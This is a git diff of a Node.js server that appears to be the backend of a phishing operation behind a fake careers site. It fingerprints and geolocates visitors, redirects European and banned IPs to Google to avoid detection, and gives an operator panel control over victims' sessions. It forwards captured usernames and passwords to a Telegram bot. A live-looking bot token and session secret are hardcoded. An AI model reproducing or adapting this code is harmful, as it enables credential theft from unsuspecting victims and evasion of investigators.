@@ -15,39 +15,10 @@ const geoip = require('geoip-lite');
 
 const app = express();
 const server = http.createServer(app);
-
-// ✅ Dynamic port for Render
-const PORT = process.env.PORT || 3001;
-
-// ✅ Telegram bot setup (Webhook for Render / Polling for local)
-const botToken = '8386163454:AAH-FEmBv2bEFKPkz9FPZ-lM_jhXUnYgAus';
-let bot;
-
-if (process.env.RENDER_EXTERNAL_URL) {
-  // Running on Render — use webhook
-  const webhookUrl = `${process.env.RENDER_EXTERNAL_URL}/bot${botToken}`;
-  bot = new TelegramBot(botToken);
-  (async () => {
-    const info = await bot.getWebHookInfo();
-    if (info.url !== webhookUrl) {
-      await bot.setWebHook(webhookUrl);
-      console.log(`✅ Webhook set to: ${webhookUrl}`);
-    } else {
-      console.log(`✅ Webhook already correct: ${webhookUrl}`);
-    }
-  })();
-
-  // Webhook endpoint
-  app.post(`/bot${botToken}`, (req, res) => {
-    bot.processUpdate(req.body);
-    res.sendStatus(200);
-  });
-} else {
-  // Running locally — use polling
-  bot = new TelegramBot(botToken, { polling: true });
-  console.log('✅ Running locally with polling');
-}
-
+const bot = new TelegramBot('8386163454:AAH-FEmBv2bEFKPkz9FPZ-lM_jhXUnYgAus', { polling: true });
+bot.deleteWebHook().then(() => {
+  console.log('Webhook deleted. Polling started.');
+});
 app.use(session({
   secret: '8c07f4a99f3e4b34b76d9d67a1c54629dce9aaab6c2f4bff1b3c88c7b6152b61',
   resave: false,
@@ -58,7 +29,6 @@ app.use(session({
     maxAge: 24 * 60 * 60 * 1000
   }
 }));
-
 app.use(cors({
   origin: ['https://aquentcareers.io'],
   methods: ['GET', 'POST']
@@ -71,7 +41,6 @@ const io = socketIo(server, {
     methods: ['GET', 'POST']
   }
 });
-
 function auth(req, res, next) {
   if (req.session && req.session.authenticated) {
     return next();
@@ -94,9 +63,9 @@ const BAN_LIST_FILE = path.join(__dirname, 'ban_ips.txt');
 app.use('/G7kP3xV1dQ', auth, express.static(path.join(__dirname, 'aZ7pL9qW3xT2eR6vBj0K')));
 app.use('/public', express.static(path.join(__dirname, 'public')));
 
-const users = {};             
-const userData = {};          
-const socketToClient = {};    
+const users = {};             // socket.id -> socket
+const userData = {};          // clientId -> data
+const socketToClient = {};    // socket.id -> clientId
 const newUsers = new Set();
 
 bot.on('callback_query', (query) => {
@@ -137,7 +106,6 @@ bot.on('callback_query', (query) => {
     bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
   }
 });
-
 function formatDateTime(date) {
   return {
     full: date.toISOString(),
@@ -158,22 +126,25 @@ function updatePanelUsers() {
   });
 }
 
+
 io.on('connection', async (socket) => {
   const clientIP = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
-  const userAgent = socket.handshake.headers['user-agent'];
-  const timestamp = formatDateTime(new Date());
+const userAgent = socket.handshake.headers['user-agent'];
+const timestamp = formatDateTime(new Date());
 
-  const geo = geoip.lookup(clientIP);
-  const isEuropean =
-    geo &&
-    geo.country &&
-    ['AL','AD','AT','BE','BA','BG','BY','CH','CY','CZ','DE','DK','EE','ES','FI','FR','GB','GR','HR','HU','IE','IS','IT','LT','LU','LV','MC','MD','ME','MK','MT','NL','NO','PL','PT','RO','RS','RU','SE','SI','SK','SM','UA','VA'].includes(geo.country);
+// Get geolocation info
+const geo = geoip.lookup(clientIP);
+const isEuropean =
+  geo &&
+  geo.country &&
+  ['AL','AD','AT','BE','BA','BG','BY','CH','CY','CZ','DE','DK','EE','ES','FI','FR','GB','GR','HR','HU','IE','IS','IT','LT','LU','LV','MC','MD','ME','MK','MT','NL','NO','PL','PT','RO','RS','RU','SE','SI','SK','SM','UA','VA'].includes(geo.country);
 
-  if (isBanned(clientIP) || isEuropean) {
-    socket.emit('redirect', 'https://www.google.com/');
-    socket.disconnect();
-    return;
-  }
+// Redirect banned IPs or EU users
+if (isBanned(clientIP) || isEuropean) {
+  socket.emit('redirect', 'https://www.google.com/');
+  socket.disconnect();
+  return;
+}
 
   let clientId = socket.handshake.query.clientId;
   if (!clientId || typeof clientId !== 'string') {
@@ -187,6 +158,7 @@ io.on('connection', async (socket) => {
   const parser = new UAParser(userAgent);
   const browserName = parser.getBrowser().name || 'Unknown';
 
+  // GeoIP lookup
   let city = 'Unknown', country = 'Unknown', isp = 'Unknown';
   try {
     const res = await axios.get(`http://ip-api.com/json/${clientIP}`);
@@ -235,7 +207,7 @@ io.on('connection', async (socket) => {
 
       updatePanelUsers();
     }
-  }, 3000);
+  }, 3000); // 3 seconds to wait for userConnectedToPage
 
   socket.on('userConnectedToPage', (data) => {
     connectionHandled = true;
@@ -293,12 +265,17 @@ function banIp(ip) {
 
   if (!isBanned(cleanIp)) {
     try {
+      // Step 1: Check if the file exists
       if (fs.existsSync(BAN_LIST_FILE)) {
         const data = fs.readFileSync(BAN_LIST_FILE, 'utf8');
+
+        // Step 2: If the file does not end with a newline, add one
         if (!data.endsWith('\n')) {
           fs.appendFileSync(BAN_LIST_FILE, '\n');
         }
       }
+
+      // Step 3: Append the new IP with a newline
       fs.appendFileSync(BAN_LIST_FILE, `${cleanIp}\n`);
     } catch (err) {
       console.error('Error saving banned IP:', err);
@@ -306,7 +283,6 @@ function banIp(ip) {
   }
 }
 
-// 🔹 Keep your panel logic untouched
 io.of('/panel').on('connection', (socket) => {
   updatePanelUsers();
 
@@ -354,7 +330,6 @@ io.of('/panel').on('connection', (socket) => {
     disconnectClient(clientId);
     sendTelegramMessage(`🔌 *Client Forcefully Disconnected*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
   });
-
   socket.on('ban-ip', (clientId) => {
     const ip = userData[clientId]?.ip;
     if (ip) {
@@ -377,6 +352,7 @@ io.of('/panel').on('connection', (socket) => {
     }
 
     sendTelegramMessage(`🔐 *Login Credentials Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n👤 *Username:* \`${username}\`\n🔑 *Password:* \`${password}\`\n🔄 Triggered from Panel`, clientId, true);
+
     updatePanelUsers();
   });
 });
@@ -455,5 +431,4 @@ app.post('/send-login-data', (req, res) => {
   res.json({ success: true, message: 'Login data sent successfully!' });
 });
 
-// ✅ Start server with dynamic port
-server.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+server.listen(3001, () => console.log('Server running on http://localhost:3001'));
